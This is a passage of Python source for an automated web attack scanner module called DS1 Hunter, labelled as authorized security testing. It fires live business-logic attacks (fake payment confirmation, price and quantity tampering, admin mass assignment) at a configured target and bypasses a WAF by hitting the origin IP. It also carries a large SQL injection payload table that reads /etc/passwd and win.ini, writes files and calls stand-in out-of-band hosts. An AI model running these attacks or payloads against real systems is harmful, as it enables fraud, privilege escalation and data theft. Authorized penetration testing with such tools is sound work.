"""
DS1 Hunter - Module 4: Business Logic Engine
DigitalSecurity1 - "Hunt. Chain. Prove."

Tests for business logic flaws by replaying and mutating HTTP request
sequences. Detects price manipulation, payment bypass, coupon abuse,
account takeover flows, and race conditions in critical workflows.
"""

import asyncio
import logging
import re
import time as _time
from typing import Any, Dict, List, Optional

import aiohttp
from core import scan_proxy
from core.scan_proxy import AsyncRateLimiter, response_cache

from core.evidence import build_evidence, enrich_findings
from core.knowledge import enrich_findings_knowledge
from core.modules.memory_corruption import scan_memory_corruption
from core.modules.stack_overflow import scan_stack_overflow
from core.modules.heap_overflow import scan_heap_overflow
from core.modules.http_response_splitting import scan_http_response_splitting

logger = logging.getLogger("ds1hunter.logic")

# ── Pre-compiled regexes for performance ────────────────────────────────────
_RE_SQLI_ERRORS = re.compile(
    "|".join([
        r"you have an error in your sql syntax",
        r"warning: mysql_",
        r"mysql_num_rows", r"mysql_fetch",
        r"supplied argument is not a valid mysql",
        r"pg_query\(\)", r"pg_exec\(\)", r"psycopg2",
        r"unterminated quoted string",
        r"syntax error at or near",
        r"invalid input syntax for type",
        r"microsoft ole db provider for sql server",
        r"odbc sql server driver",
        r"mssql_query\(\)",
        r"incorrect syntax near",
        r"unclosed quotation mark after the character string",
        r"syntax error converting",
        r"com\.microsoft\.sqlserver",
        r"ora-00933", r"ora-00907", r"ora-01756", r"ora-00942",
        r"quoted string not properly terminated",
        r"sqlite3", r"sqlite_version",
        r"unrecognized token",
        r"django\.db\.utils", r"django\.db\.backends",
        r"sqlstate\[",
        r"hibernateexception",
        r"activerecord::statementinvalid",
        r"nhibernate",
        r"db2 sql error",
    ]),
    re.I,
)

_RE_JSON_KEYS = re.compile(r'"(\w+)":')


def _build_attack_trace(callback):
    if not callback:
        return None

    async def on_request_end(session, ctx, params) -> None:
        try:
            import asyncio as _asyncio
            _asyncio.create_task(callback({
                "method": str(params.method),
                "url": str(params.url),
                "status": params.response.status,
            }))
        except Exception:
            pass

    tc = aiohttp.TraceConfig()
    tc.on_request_end.append(on_request_end)
    return tc


class BusinessLogicEngine:
    """
    Tests application business logic for exploitable flaws.

    Test categories:
      - Price manipulation: modify price/amount fields in cart/checkout
      - Payment bypass: skip or replay payment confirmation steps
      - Coupon abuse: reuse single-use coupons, stack discounts
      - Negative quantity: use negative values to reverse charges
      - Race conditions: concurrent requests to claim limited resources
      - Account takeover: password reset/token reuse flows
    """

    def __init__(
        self,
        target: str,
        config: Optional[Dict[str, Any]] = None,
        attack_callback=None,
        auth_manager=None,
        oob_client=None,
        progress_callback=None,
    ):
        self.target = target.rstrip("/")
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.rate_limit = self.config.get("rate_limit", 0.15)
        self.token = self.config.get("token_user_a", "")
        self.attack_callback = attack_callback
        self.auth_manager = auth_manager
        self.oob_client = oob_client
        self.progress_callback = progress_callback

        # Think Engine - initialised lazily after tech stack is known
        # Track (url, test_type) combos already tested this run to prevent redundant requests
        self._tested_combos: set = set()

        self._think_engine = None
        if self.config.get("think_mode"):
            from core.think_engine import build_think_engine
            tech_stack = self.config.get("tech_stack", [])
            depth = self.config.get("scan_depth", self.config.get("depth", "deep"))
            self._think_engine = build_think_engine(tech_stack, depth, self.config)
            logger.info("[Logic] Think mode active - engine ready")

    # ------------------------------------------------------------------ #
    #  Think Engine helpers                                               #
    # ------------------------------------------------------------------ #

    def _think_select(self, module: str, payloads: list) -> list:
        """If Think mode is active, return a scored+filtered subset; else pass-through."""
        if self._think_engine is None:
            return payloads
        return self._think_engine.select(module, payloads)

    def _think_generate(self, module: str, param: str, body: str, injected: str = "") -> list:
        """Generate runtime payloads from the observed response when Think mode is active."""
        if self._think_engine is None:
            return []
        return self._think_engine.generate_from_response(module, param, body, injected)

    def _mark_tested(self, url: str, test_type: str) -> bool:
        """Return True (and record) if this (url, test_type) combo is new; False if already tested."""
        from urllib.parse import urlparse
        key = (urlparse(url).path.rstrip("/") or "/", test_type)
        if key in self._tested_combos:
            return False
        self._tested_combos.add(key)
        return True

    # ------------------------------------------------------------------ #
    #  Public entry point                                                  #
    # ------------------------------------------------------------------ #

    async def run(self, discovered_endpoints: List[str] = None) -> Dict[str, Any]:
        """
        Run all business logic tests.

        Args:
            discovered_endpoints: Optional list of endpoint URLs from Phase 1.
                                  Used to expand SQLi and XSS attack surface
                                  beyond hardcoded paths.
        Returns:
            {"logic_flaws": [...]}
        """
        self._discovered_endpoints = discovered_endpoints or []
        logger.info("[Logic] Starting business logic tests on %s", self.target)

        # ── WAF/CDN origin bypass ─────────────────────────────────────────
        origin_ip     = self.config.get("origin_ip")
        bypass_host   = self.config.get("bypass_host", "")
        origin_scheme = self.config.get("origin_scheme", "http")
        origin_port   = self.config.get("origin_port")
        _waf_bypass_active = False

        if origin_ip and bypass_host:
            old_target = self.target
            port_str = f":{origin_port}" if origin_port and origin_port not in (80, 443) else ""
            self.target = f"{origin_scheme}://{origin_ip}{port_str}"
            # Rewrite discovered endpoint URLs to target origin IP
            self._discovered_endpoints = self._rewrite_urls_for_origin(
                self._discovered_endpoints, old_target, self.target
            )
            _waf_bypass_active = True
            logger.warning(
                "[Logic] WAF BYPASS: attacking origin %s directly (Host: %s)",
                self.target, bypass_host,
            )

        connector = scan_proxy.make_connector(limit=self.config.get("concurrency", 5))
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        headers = {
            "User-Agent": (
                "DS1Hunter/1.0 (DigitalSecurity1 Authorized Security Scanner)"
            ),
            "Content-Type": "application/json",
        }
        if _waf_bypass_active:
            headers["Host"] = bypass_host
        if self.token:
            headers["Authorization"] = f"Bearer {self.token}"
        if self.auth_manager:
            headers.update(self.auth_manager.get_headers())
        tc = _build_attack_trace(self.attack_callback)
        auth_cookies = self.auth_manager.get_cookies() if self.auth_manager else {}

        flaws: List[Dict[str, Any]] = []

        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=headers,
            cookies=auth_cookies or None,
            trace_configs=[tc] if tc else [],
        ) as session:
            if self.auth_manager:
                await self.auth_manager.authenticate(session)
            
            if self.progress_callback:
                await self.progress_callback("Testing business logic flaws...", 10, [])

            # Helper: run a test coro with a hard timeout; on timeout return [] so gather
            # treats it like a test that found nothing rather than blocking indefinitely.
            async def _t(coro, secs):
                try:
                    return await asyncio.wait_for(coro, timeout=secs)
                except asyncio.TimeoutError:
                    logger.debug("[Logic] Test timed out after %ss", secs)
                    return []
                except Exception as exc:
                    logger.debug("[Logic] Test error: %s", exc)
                    return []

            results = await asyncio.gather(
                _t(self._test_price_manipulation(session),     90),
                _t(self._test_negative_quantity(session),      90),
                _t(self._test_coupon_abuse(session),           90),
                _t(self._test_payment_bypass(session),         90),
                _t(self._test_race_condition(session),         90),
                _t(self._test_account_takeover_flow(session),  90),
                _t(self._test_mass_assignment(session),        90),
                return_exceptions=True,
            )

            # Stream partial findings after business logic tests (don't modify flaws yet)
            _stream = [f for r in results if isinstance(r, list) for f in r]
            if self.progress_callback and _stream:
                await self.progress_callback("Business logic tests complete...", 35, _stream)

            if self.progress_callback:
                await self.progress_callback("Mining hidden parameters...", 38, _stream)

            # Run param mining first — expands self._discovered_endpoints for injection tests
            # Internal per-endpoint budget is 180s; outer cap is 360s for the whole mining phase.
            param_mining_results = await asyncio.gather(
                _t(self._test_param_mining(session), 360),
                return_exceptions=True,
            )

            if self.progress_callback:
                await self.progress_callback("Testing injection vulnerabilities...", 40, _stream)

            injection_results = await asyncio.gather(
                _t(self._test_sql_injection(session),       240),
                _t(self._test_xss_parameters(session),      240),
                _t(self._test_ssti(session),                 120),
                _t(self._test_command_injection(session),    120),
                _t(self._test_nosql_injection(session),      120),
                _t(self._test_xxe(session),                   90),
                _t(self._test_blind_cmdi_oob(session),        60),
                _t(self._test_blind_xxe_oob(session),         60),
                _t(self._test_ssrf_dedicated(session),       120),
                return_exceptions=True,
            )

            # Stream injection findings
            _stream = _stream + [f for r in injection_results if isinstance(r, list) for f in r]
            if self.progress_callback and _stream:
                await self.progress_callback("Injection tests complete...", 65, _stream)

            if self.progress_callback:
                await self.progress_callback("Testing advanced attack vectors and new vuln classes...", 70, _stream)

            advanced_results = await asyncio.gather(
                _t(self._test_email_enumeration(session),           60),
                _t(self._test_http_parameter_pollution(session),    60),
                _t(self._test_path_traversal(session),             120),
                _t(self._test_open_redirect(session),               90),
                _t(self._test_http_smuggling(),                     60),
                _t(self._test_deserialization(session),             90),
                _t(self._test_prototype_pollution(session),         90),
                _t(self._test_cache_poisoning(session),             60),
                _t(self._test_oauth_flows(session),                 90),
                _t(self._test_cors(session),                        60),
                _t(self._test_clickjacking(session),                30),
                _t(self._test_dom_xss(session),                    120),
                _t(self._test_integer_overflow(session),            90),
                _t(self._test_redos(session),                       90),
                _t(self._test_format_string_injection(session),     60),
                _t(self._test_large_input_disclosure(session),      60),
                _t(self._test_graphql(session),                     60),
                _t(self._test_mfa_bypass(session),                  60),
                _t(self._test_jwt_attacks(session),                 90),
                _t(self._test_idor_bola(session),                  120),
                _t(self._test_bfla(session),                       120),
                _t(self._test_excessive_data_exposure(session),     60),
                return_exceptions=True,
            )

            # Memory corruption testing (if selected)
            memory_results = []
            if self.config.get("modules") and "memory" in self.config["modules"]:
                if self.progress_callback:
                    await self.progress_callback("Testing memory corruption vulnerabilities...", 85)
                memory_results = await asyncio.gather(
                    _t(self._test_memory_corruption(session), 120),
                    return_exceptions=True,
                )

            # Stack overflow testing (if selected)
            stack_results = []
            if self.config.get("modules") and "stack" in self.config["modules"]:
                if self.progress_callback:
                    await self.progress_callback("Testing stack overflow vulnerabilities...", 87)
                stack_results = await asyncio.gather(
                    _t(self._test_stack_overflow(session), 120),
                    return_exceptions=True,
                )

            # Heap overflow testing (if selected)
            heap_results = []
            if self.config.get("modules") and "heap" in self.config["modules"]:
                if self.progress_callback:
                    await self.progress_callback("Testing heap overflow vulnerabilities...", 89)
                heap_results = await asyncio.gather(
                    _t(self._test_heap_overflow(session), 120),
                    return_exceptions=True,
                )

            # HTTP response splitting testing (if selected)
            response_splitting_results = []
            if self.config.get("modules") and "response_splitting" in self.config["modules"]:
                if self.progress_callback:
                    await self.progress_callback("Testing HTTP response splitting vulnerabilities...", 91)
                response_splitting_results = await asyncio.gather(
                    _t(self._test_http_response_splitting(session), 120),
                    return_exceptions=True,
                )

        # Combine all results
        all_results = results + param_mining_results + injection_results + advanced_results + memory_results + stack_results + heap_results + response_splitting_results

        for r in all_results:
            if isinstance(r, list):
                flaws.extend(r)
            elif isinstance(r, Exception):
                logger.debug("[Logic] Test error: %s", r)

        enrich_findings(flaws)
        enrich_findings_knowledge(flaws)

        if _waf_bypass_active:
            for f in flaws:
                f["waf_bypass"] = True
                f["bypass_host"] = bypass_host
                f["origin_ip"]   = origin_ip

        logger.info("[Logic] Found %d logic flaws%s", len(flaws),
                    " (via WAF bypass)" if _waf_bypass_active else "")
        return {"logic_flaws": flaws}

    # ------------------------------------------------------------------ #
    #  Helpers                                                             #
    # ------------------------------------------------------------------ #

    @staticmethod
    def _rewrite_urls_for_origin(urls: List[str], old_base: str, new_base: str) -> List[str]:
        from urllib.parse import urlparse, urlunparse
        old_parsed = urlparse(old_base)
        new_parsed  = urlparse(new_base)
        result = []
        for url in urls:
            p = urlparse(url)
            if p.netloc == old_parsed.netloc:
                url = urlunparse((new_parsed.scheme, new_parsed.netloc,
                                  p.path, p.params, p.query, p.fragment))
            result.append(url)
        return result

    def _is_dynamic_path(self, path: str) -> bool:
        """Return True only if the path could be a dynamic endpoint.
        Static assets (.js, .css, images, fonts, etc.) can never be
        vulnerable to injection attacks and are always skipped."""
        last_seg = path.rsplit("/", 1)[-1]
        if "." in last_seg:
            ext = "." + last_seg.rsplit(".", 1)[-1].lower()
            return ext not in self._STATIC_EXTENSIONS
        return True

    # ------------------------------------------------------------------ #
    #  Test: Price Manipulation                                            #
    # ------------------------------------------------------------------ #

    async def _test_price_manipulation(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Attempt to modify item price in cart/checkout payloads.
        Tests: price=0, price=-1, price=0.01
        """
        flaws = []
        cart_paths = [
            "/api/cart",
            "/api/cart/items",
            "/api/checkout",
            "/api/orders",
            "/cart",
            "/checkout",
        ]

        for path in cart_paths:
            url = self.target + path
            for manipulated_price in [0, -1, 0.01]:
                payload = {
                    "item_id": 1,
                    "quantity": 1,
                    "price": manipulated_price,
                }
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.post(url, json=payload) as resp:
                        if resp.status in (200, 201):
                            body = await resp.text(errors="replace")
                            # Look for acceptance of the manipulated price
                            if self._price_accepted(body, manipulated_price):
                                flaws.append(
                                    {
                                        "type": "price_manipulation",
                                        "endpoint": url,
                                        "method": "POST",
                                        "severity": "CRITICAL",
                                        "description": (
                                            f"Price manipulation accepted at {path}: "
                                            f"submitted price={manipulated_price}, "
                                            f"server returned HTTP {resp.status}."
                                        ),
                                        "proof": {
                                            "original_price": 100,
                                            "manipulated_price": manipulated_price,
                                            "checkout_successful": True,
                                            "response_status": resp.status,
                                            "payload": payload,
                                        },
                                    }
                                )
                except Exception as exc:
                    logger.debug("[Logic] Price test error %s: %s", url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Negative Quantity                                             #
    # ------------------------------------------------------------------ #

    async def _test_negative_quantity(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """Test whether negative/extreme quantities are accepted."""
        flaws = []
        paths = ["/api/cart/items", "/api/orders", "/cart", "/api/cart",
                 "/api/basket", "/api/basket/items"]

        # Negative, zero, float, large integer, and integer overflow values
        test_quantities = [
            (-1,                   "negative quantity"),
            (-9999,                "large negative quantity"),
            (0,                    "zero quantity"),
            (0.001,                "fractional quantity"),
            (9999999999,           "very large quantity"),
            (2**31,                "32-bit integer overflow"),
            (2**32,                "unsigned 32-bit overflow"),
            (2**63,                "64-bit integer overflow"),
            (-2**31,               "32-bit signed minimum"),
            (1e308,                "float overflow"),
        ]

        for path in paths:
            url = self.target + path
            for qty, desc in test_quantities:
                payload = {"item_id": 1, "quantity": qty, "price": 100}
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.post(url, json=payload) as resp:
                        body = await resp.text(errors='replace')
                        if resp.status in (200, 201):
                            flaws.append({
                                "type":     "quantity_manipulation",
                                "endpoint": url,
                                "method":   "POST",
                                "severity": "HIGH",
                                "description": (
                                    f"{desc.capitalize()} accepted at {path} (qty={qty}): "
                                    "may allow credit reversal, balance inflation, or overflow."
                                ),
                                "proof": {
                                    "payload":         payload,
                                    "response_status": resp.status,
                                    "response_excerpt": body[:200],
                                },
                            })
                            break  # found one; move to next path
                except Exception as exc:
                    logger.debug("[Logic] Qty test error %s: %s", url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Coupon Abuse                                                  #
    # ------------------------------------------------------------------ #

    async def _test_coupon_abuse(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Test for coupon reuse and stacking vulnerabilities.
        Applies the same coupon twice and checks if both succeed.
        """
        flaws = []
        coupon_paths = [
            "/api/coupons/apply",
            "/api/discount",
            "/api/checkout/coupon",
            "/coupons",
        ]
        test_coupon = "SAVE10"

        for path in coupon_paths:
            url = self.target + path
            payload = {"code": test_coupon, "cart_id": 1}

            # Apply coupon twice
            statuses = []
            for _ in range(2):
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.post(url, json=payload) as resp:
                        statuses.append(resp.status)
                except Exception:
                    statuses.append(0)

            if len(statuses) == 2 and statuses[0] == 200 and statuses[1] == 200:
                flaws.append(
                    {
                        "type": "coupon_abuse",
                        "endpoint": url,
                        "method": "POST",
                        "severity": "HIGH",
                        "description": (
                            f"Coupon reuse possible at {path}: "
                            f"coupon '{test_coupon}' applied successfully twice."
                        ),
                        "proof": {
                            "coupon_code": test_coupon,
                            "first_apply_status": statuses[0],
                            "second_apply_status": statuses[1],
                            "reuse_successful": True,
                        },
                    }
                )

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Payment Bypass                                                #
    # ------------------------------------------------------------------ #

    async def _test_payment_bypass(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Attempt to confirm an order without completing payment.
        Tests submitting confirmation step directly.
        """
        flaws = []
        confirm_paths = [
            "/api/orders/confirm",
            "/api/checkout/confirm",
            "/api/payment/confirm",
            "/api/orders/complete",
        ]

        for path in confirm_paths:
            url = self.target + path
            # Submit a fake confirmed payment
            payload = {
                "order_id": 1,
                "payment_status": "completed",
                "payment_id": "FAKE_PAYMENT_123",
            }
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.post(url, json=payload) as resp:
                    if resp.status in (200, 201):
                        body = await resp.text(errors="replace")
                        if self._order_confirmed(body):
                            flaws.append(
                                {
                                    "type": "payment_bypass",
                                    "endpoint": url,
                                    "method": "POST",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"Payment bypass possible at {path}: "
                                        "order confirmed without verified payment."
                                    ),
                                    "proof": {
                                        "payload": payload,
                                        "response_status": resp.status,
                                        "order_confirmed": True,
                                    },
                                }
                            )
            except Exception as exc:
                logger.debug("[Logic] Payment bypass test error %s: %s", url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Race Condition                                                #
    # ------------------------------------------------------------------ #

    async def _test_race_condition(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Send concurrent requests to detect race conditions on limited-use resources.
        Tests single-use coupon redemption with 10 simultaneous requests.
        """
        flaws = []
        race_paths = ["/api/coupons/apply", "/api/orders/confirm", "/api/referral/claim"]

        for path in race_paths:
            url = self.target + path
            payload = {"code": "RACE_TEST", "cart_id": 1}

            # Fire 10 concurrent requests
            tasks = []
            for _ in range(10):
                tasks.append(self._fire_request(session, url, payload))

            results = await asyncio.gather(*tasks, return_exceptions=True)
            successes = [
                r for r in results if isinstance(r, int) and r in (200, 201)
            ]

            if len(successes) > 1:
                flaws.append(
                    {
                        "type": "race_condition",
                        "endpoint": url,
                        "method": "POST",
                        "severity": "HIGH",
                        "description": (
                            f"Race condition detected at {path}: "
                            f"{len(successes)}/10 concurrent requests succeeded "
                            "on a presumably single-use operation."
                        ),
                        "proof": {
                            "concurrent_requests": 10,
                            "successes": len(successes),
                            "payload": payload,
                        },
                    }
                )

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Account Takeover Flow                                         #
    # ------------------------------------------------------------------ #

    async def _test_account_takeover_flow(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Test password reset token predictability and reuse.
        Requests a reset token and attempts to reuse it.
        """
        flaws = []
        reset_paths = [
            "/api/auth/reset-password",
            "/api/users/reset",
            "/api/password-reset",
            "/auth/reset",
        ]

        for path in reset_paths:
            url = self.target + path
            payload = {"email": "test@example.com"}
            try:
                await asyncio.sleep(self.rate_limit)
                async with session.post(url, json=payload) as resp:
                    if resp.status == 200:
                        body_text = await resp.text(errors="replace")
                        # Check if token is returned directly in response (bad practice)
                        token_in_body = bool(
                            re.search(r'"token"\s*:\s*"[^"]+"', body_text)
                        )
                        if token_in_body:
                            flaws.append(
                                {
                                    "type": "account_takeover",
                                    "endpoint": url,
                                    "method": "POST",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"Password reset token returned in response body at {path}. "
                                        "An attacker can use this token to reset any account."
                                    ),
                                    "proof": {
                                        "request": f"POST {url}",
                                        "response_status": resp.status,
                                        "token_in_response": True,
                                        "impact": "Account takeover for any user",
                                    },
                                }
                            )
            except Exception as exc:
                logger.debug("[Logic] ATO test error %s: %s", url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: Mass Assignment                                               #
    # ------------------------------------------------------------------ #

    async def _test_mass_assignment(
        self, session: aiohttp.ClientSession
    ) -> List[Dict[str, Any]]:
        """
        Test for mass assignment - inject privileged fields into update payloads.
        If is_admin, role, or verified fields are accepted, account escalation is possible.
        """
        flaws = []
        update_paths = [
            "/api/users/me", "/api/profile", "/api/account",
            "/api/v1/users/me", "/api/v1/profile",
        ]
        # Fields that should never be settable via user-facing endpoints
        privileged_payloads = [
            {"is_admin": True},
            {"role": "admin"},
            {"admin": True},
            {"is_superuser": True},
            {"verified": True},
            {"balance": 99999},
            {"credits": 99999},
            {"subscription": "premium"},
            {"plan": "enterprise"},
        ]

        for path in update_paths:
            url = self.target + path
            for payload in privileged_payloads:
                try:
                    await asyncio.sleep(self.rate_limit)
                    async with session.put(url, json=payload) as resp:
                        if resp.status in (200, 201):
                            body = await resp.text(errors="replace")
                            field = list(payload.keys())[0]
                            value = list(payload.values())[0]
                            # Check if the server echoed back the privileged value
                            if str(value).lower() in body.lower() or field in body:
                                flaws.append({
                                    "type": "mass_assignment",
                                    "endpoint": url,
                                    "method": "PUT",
                                    "severity": "CRITICAL",
                                    "description": (
                                        f"Mass assignment at {path}: "
                                        f"privileged field '{field}' accepted and reflected in response."
                                    ),
                                    "proof": {
                                        "payload": payload,
                                        "response_status": resp.status,
                                        "field_reflected": True,
                                        "impact": "Account privilege escalation",
                                    },
                                    "remediation": [
                                        "Use an explicit allowlist for fields accepted in update payloads",
                                        "Never bind request body directly to ORM model (avoid .update(request.data))",
                                    ],
                                })
                                break
                except Exception as exc:
                    logger.debug("[Logic] Mass assignment test error %s: %s", url, exc)

        return flaws

    # ------------------------------------------------------------------ #
    #  Test: SQL Injection (active detection)                              #
    # ------------------------------------------------------------------ #

    # ---- payload table --------------------------------------------------
    # Total: 207 payloads
    # Format: (technique, db_engine, payload)
    _SQLI_PAYLOADS = [

        # ================================================================ #
        #  ERROR-BASED – GENERIC  (9 payloads)                             #
        # ================================================================ #
        ("error", "generic",    "'"),
        ("error", "generic",    "''"),
        ("error", "generic",    "`"),
        ("error", "generic",    "' OR '1'='1"),
        ("error", "generic",    "\" OR \"1\"=\"1"),
        ("error", "generic",    "' OR 1=1--"),
        ("error", "generic",    "' OR 1=1#"),
        ("error", "generic",    "') OR ('1'='1"),
        ("error", "generic",    "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--"),

        # ================================================================ #
        #  ERROR-BASED – MYSQL  (19 payloads)                              #
        # ================================================================ #
        # Classic extractvalue / updatexml
        ("error", "mysql",      "' AND extractvalue(1,concat(0x7e,version()))--"),
        ("error", "mysql",      "' AND updatexml(1,concat(0x7e,(SELECT database())),1)--"),
        ("error", "mysql",      "' AND updatexml(1,xpath_string,1)--"),
        # floor(rand()) double-evaluation
        ("error", "mysql",      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--"),
        ("error", "mysql",      "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.columns GROUP BY x)a)--"),
        # ORDER BY column-count oracle
        ("error", "mysql",      "1' ORDER BY 1--"),
        ("error", "mysql",      "1' ORDER BY 100--"),
        ("error", "mysql",      "1' ORDER BY 1,2--"),
        # Limit/offset injection
        ("error", "mysql",      "' AND 1=1 LIMIT 1--"),
        ("error", "mysql",      "1 LIMIT 0,1 UNION SELECT NULL--"),
        # Hex-encoded string bypass
        ("error", "mysql",      "' AND 0x313d31--"),
        ("error", "mysql",      "' OR 0x313d31--"),
        # information_schema probing
        ("error", "mysql",      "' UNION SELECT table_name FROM information_schema.tables--"),
        ("error", "mysql",      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"),
        # JSON injection (MySQL 5.7+)
        ("error", "mysql",      "' AND JSON_KEYS(version())--"),
        ("error", "mysql",      "1 AND JSON_EXTRACT('{\"a\":1}','$.a')=1--"),
        # ELT / field function abuse
        ("error", "mysql",      "' AND ELT(1=1,SLEEP(0))--"),
        # Procedure analyse
        ("error", "mysql",      "' PROCEDURE ANALYSE()--"),
        # Load file (detects FILE privilege)
        ("error", "mysql",      "' UNION SELECT LOAD_FILE('/etc/passwd')--"),

        # ================================================================ #
        #  ERROR-BASED – POSTGRESQL  (13 payloads)                         #
        # ================================================================ #
        ("error", "postgres",   "' AND 1=CAST((SELECT version()) AS INT)--"),
        ("error", "postgres",   "' AND 1=CAST((SELECT current_database()) AS INT)--"),
        ("error", "postgres",   "' ; SELECT pg_sleep(0)--"),
        ("error", "postgres",   "'; SELECT 1/0--"),
        # Dollar-quote bypass
        ("error", "postgres",   "' OR $$1$$=$$1$$--"),
        ("error", "postgres",   "' AND $$x$$=$$y$$--"),
        # Regex operator
        ("error", "postgres",   "' AND 1=~'[0'::text--"),
        # Type coercion
        ("error", "postgres",   "' AND 1::text='a'::int--"),
        # COPY injection
        ("error", "postgres",   "'; COPY (SELECT 1) TO '/tmp/ds1h_canary'--"),
        # pg_read_file (superuser only - reveals privilege)
        ("error", "postgres",   "' AND length(pg_read_file('/etc/passwd'))>0--"),
        # information_schema
        ("error", "postgres",   "' UNION SELECT table_name FROM information_schema.tables LIMIT 1--"),
        # Error via generate_series
        ("error", "postgres",   "' AND 1=(SELECT generate_series(1,1))--"),
        # pg_catalog
        ("error", "postgres",   "' UNION SELECT usename FROM pg_catalog.pg_user LIMIT 1--"),

        # ================================================================ #
        #  ERROR-BASED – MSSQL  (13 payloads)                              #
        # ================================================================ #
        ("error", "mssql",      "'; SELECT @@version--"),
        ("error", "mssql",      "'; SELECT @@servername--"),
        ("error", "mssql",      "' AND 1=CONVERT(int,@@version)--"),
        ("error", "mssql",      "' AND 1=CONVERT(int,db_name())--"),
        ("error", "mssql",      "' HAVING 1=1--"),
        ("error", "mssql",      "' GROUP BY columnnames HAVING 1=1--"),
        # sys tables
        ("error", "mssql",      "' UNION SELECT name FROM sys.databases--"),
        ("error", "mssql",      "' UNION SELECT name FROM sys.tables--"),
        # XML path
        ("error", "mssql",      "' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U')--"),
        ("error", "mssql",      "'; SELECT name FROM sysobjects WHERE xtype='U'--"),
        # OPENROWSET (OOB detection)
        ("error", "mssql",      "'; EXEC master..xp_dirtree '\\\\ds1hunter_oob.invalid\\x'--"),
        # Bulk insert
        ("error", "mssql",      "'; BULK INSERT tmp FROM 'c:\\windows\\win.ini'--"),
        # sp_executesql
        ("error", "mssql",      "'; EXEC sp_executesql N'SELECT 1'--"),

        # ================================================================ #
        #  ERROR-BASED – ORACLE  (10 payloads)                             #
        # ================================================================ #
        ("error", "oracle",     "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('ds1hunter')--"),
        ("error", "oracle",     "' UNION SELECT NULL FROM DUAL--"),
        ("error", "oracle",     "' UNION SELECT NULL,NULL FROM DUAL--"),
        ("error", "oracle",     "' UNION SELECT NULL,NULL,NULL FROM DUAL--"),
        # XMLTYPE error injection
        ("error", "oracle",     "' AND 1=XMLTYPE('<?xml version=\"1.0\"?>'||(SELECT user FROM DUAL)||'')--"),
        # dbms_utility
        ("error", "oracle",     "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH('x')--"),
        # rownum
        ("error", "oracle",     "' AND rownum=1--"),
        # all_tables probe
        ("error", "oracle",     "' UNION SELECT table_name FROM all_tables WHERE rownum=1--"),
        # UTL_HTTP (OOB)
        ("error", "oracle",     "' AND UTL_HTTP.REQUEST('http://ds1hunter-oob.invalid/')>0--"),
        # CTXSYS
        ("error", "oracle",     "' AND CTXSYS.DRILOAD.VALIDATE_STMT('x')=1--"),

        # ================================================================ #
        #  ERROR-BASED – SQLITE  (8 payloads)                              #
        # ================================================================ #
        ("error", "sqlite",     "' AND SUBSTR(sqlite_version(),1,1)='3'--"),
        ("error", "sqlite",     "1 AND 1=2 UNION SELECT 1,sqlite_version(),3--"),
        ("error", "sqlite",     "' AND load_extension('x')--"),
        ("error", "sqlite",     "' UNION SELECT 1,sql,3 FROM sqlite_master LIMIT 1--"),
        ("error", "sqlite",     "' AND randomblob(999999999)--"),
        # writefile (via dotload)
        ("error", "sqlite",     "'; SELECT writefile('/tmp/ds1h_test',zeroblob(1))--"),
        # type coercion
        ("error", "sqlite",     "' AND typeof(1)='integer'--"),
        ("error", "sqlite",     "1 UNION SELECT name,sql,type FROM sqlite_master--"),

        # ================================================================ #
        #  ERROR-BASED – JSON INJECTION  (8 payloads)                      #
        # ================================================================ #
        # MySQL JSON operators
        ("error", "json",       "' AND JSON_EXTRACT(version(),'$.a')--"),
        ("error", "json",       "'->>'' OR 1=1--"),
        ("error", "json",       "{\"$gt\": \"\"}"),
        ("error", "json",       "{\"$ne\": null}"),
        # PostgreSQL JSON operators
        ("error", "json",       "' #>> '{}'::text[]--"),
        ("error", "json",       "'->>'x' OR '1'='1"),
        # Nested quote escape
        ("error", "json",       "\\' OR 1=1--"),
        ("error", "json",       "'; SELECT pg_sleep(0)--"),

        # ================================================================ #
        #  UNION-BASED  (17 payloads)                                       #
        # ================================================================ #
        # Generic column-count probes 1–7
        ("union", "generic",    "' UNION SELECT NULL--"),
        ("union", "generic",    "' UNION SELECT NULL,NULL--"),
        ("union", "generic",    "' UNION SELECT NULL,NULL,NULL--"),
        ("union", "generic",    "' UNION SELECT NULL,NULL,NULL,NULL--"),
        ("union", "generic",    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--"),
        ("union", "generic",    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL--"),
        ("union", "generic",    "' UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL--"),
        ("union", "generic",    "1 UNION SELECT NULL--"),
        ("union", "generic",    "1 UNION ALL SELECT NULL,NULL--"),
        # String-type detection
        ("union", "generic",    "' UNION SELECT 'ds1h','ds1h'--"),
        ("union", "generic",    "' UNION SELECT 'ds1h',NULL,NULL--"),
        # DB-specific UNION
